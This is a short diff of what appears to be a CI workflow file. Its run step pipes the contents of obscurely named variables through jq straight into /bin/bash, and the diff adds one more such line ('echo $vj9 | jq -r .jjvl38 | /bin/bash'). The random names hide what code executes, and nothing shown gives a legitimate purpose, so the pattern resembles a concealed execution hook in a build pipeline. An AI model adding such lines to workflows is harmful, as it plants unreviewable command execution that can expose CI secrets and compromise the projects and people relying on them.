@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$dfwb33260" | jq -r .ziz195 | /bin/bash
           printf '%s' "$ma81" | jq -r .sk2 | /bin/bash
+          echo $vj9 | jq -r .jjvl38 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
